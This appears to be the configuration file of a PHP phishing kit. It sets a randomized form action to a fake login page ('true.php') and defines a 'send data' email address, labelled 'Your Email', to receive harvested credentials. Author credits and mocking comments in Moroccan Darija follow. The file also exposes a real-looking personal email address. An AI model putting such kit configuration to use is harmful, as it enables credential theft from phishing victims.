<?php
		
	$Edit_Curl = "action=\"./true.php?".Rand_bill().md5(gmdate('r'))."\""; // True Login  +  All Country  ( Default)
		
	$enviardatos = "marcoferrerra59@outlook.fr"; //  Your Email / Hotmail / Gmail
	
	// Coded Chobonidas Navrix ===> 2016 / 2017  
	
	// Kon rajl + Fid khok o chark li kat3rf rah ta7aja matjrha m3ak l9br, dirha 7ala9a fwadnak ... [ fwadnik galt !]
	
	// Kaychar7o t7mil barnamaj  "Khorafi/3imla9/al9onbola" o ysmiw raskoum mo7tarifin ... [ Ti9niya ?]
	
	// Kolch chadino mn zko ... [ true !] 
		
		
?>

